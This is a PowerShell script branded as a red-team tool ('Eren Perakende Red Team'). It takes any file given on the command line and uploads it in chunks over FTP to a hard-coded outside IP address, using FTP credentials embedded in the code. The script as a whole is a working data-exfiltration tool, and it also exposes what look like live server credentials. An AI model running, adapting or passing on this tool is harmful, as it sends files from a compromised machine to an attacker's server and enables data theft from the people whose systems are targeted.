param (
    [Parameter(Mandatory=$true)]
    [string]$File
)

Clear-Host
Write-Host ""
Write-Host ""
Write-Host -Fore Red 
"
@@@  @@@  @@@@@@@@  @@@@@@@@  @@@@@@@   @@@@@@@@  @@@@@@@       @@@@@@@    @@@@@@     @@@ 
@@@@ @@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@       @@@@@@@@  @@@@@@@    @@@@ 
@@!@!@@@  @@!       @@!       @@!  @@@  @@!         @@!         @@!  @@@  !@@       @@@!! 
!@!!@!@!  !@!       !@!       !@!  @!@  !@!         !@!         !@!  @!@  !@!         !@! 
@!@ !!@!  @!!!:!    @!!!:!    @!@!!@!   @!!!:!      @!!         @!@@!@!   !!@@!!      @!@ 
!@!  !!!  !!!!!:    !!!!!:    !!@!@!    !!!!!:      !!!         !!@!!!     !!@!!!     !@! 
!!:  !!!  !!:       !!:       !!: :!!   !!:         !!:         !!:            !:!    !!: 
:!:  !:!  :!:       :!:       :!:  !:!  :!:         :!:    :!:  :!:           !:!     :!: 
 ::   ::   :: ::::   ::       ::   :::   :: ::::     ::    :::   ::       :::: ::     ::: 
::    :   : :: ::    :         :   : :  : :: ::      :     :::   :        :: : :       :: 
" 

Write-Host -Fore Red "          Eren Perakende Red Team" 
Write-Host -Fore Gray "          https://github.com/dheenaxe/ErenRedTeam"
Write-Host ""
Write-Host ""

if (-Not (Test-Path $File)) {
    Write-Error "The specified file '$File' does not exist."
    exit
}

$ftpServer = "ftp://78.129.240.79"
$ftpUsername = "6fumPfM1DAzskEEVb9p1otrXuY2WaTVj"
$ftpPassword = "VB6zHhZr26zBpBRvZroG7trbcaAwGV9t"
$ftpPath = "/"

if (Test-Connection -ComputerName 78.129.240.79 -Count 2 -Quiet) {
    $fileInfo = Get-Item $File
    $ftpUri = New-Object System.Uri("$ftpServer$ftpPath/$($fileInfo.Name)")

    $ftpRequest = [System.Net.FtpWebRequest]::Create($ftpUri)
    $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
    $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
    $ftpRequest.UseBinary = $true
    $ftpRequest.UsePassive = $true

    try {
        $ftpStream = $ftpRequest.GetRequestStream()
        Write-Host "FTP stream created successfully."
    } catch {
        Write-Error "Error creating FTP request stream: $_"
        return
    }

    $chunkSize = 1048576  
    $fileSize = [System.Int64]$fileInfo.Length  
    $bytesUploaded = 0

    $fileStream = [System.IO.File]::OpenRead($fileInfo.FullName)

    while ($bytesUploaded -lt $fileSize) {
        $bytesToRead = if ($fileSize - $bytesUploaded -lt $chunkSize) { $fileSize - $bytesUploaded } else { $chunkSize }

        $buffer = New-Object byte[] $bytesToRead
        $fileStream.Read($buffer, 0, $bytesToRead)

        try {
            $ftpStream.Write($buffer, 0, $bytesToRead)
        } catch {
            Write-Error "Error writing to FTP stream: $_"
            return
        }

        $bytesUploaded += $bytesToRead

        Write-Progress -PercentComplete (($bytesUploaded / $fileSize) * 100) -Status "Uploading..." -Activity "$bytesUploaded of $fileSize bytes uploaded"
    }

    $ftpStream.Close()
    $fileStream.Close()

    $ftpResponse = $ftpRequest.GetResponse()
    Write-Output "File '$($fileInfo.Name)' uploaded successfully to FTP server ($ftpServer)"
} else {
    Write-Output "Unable to reach the network path $($ftpServer)"
}
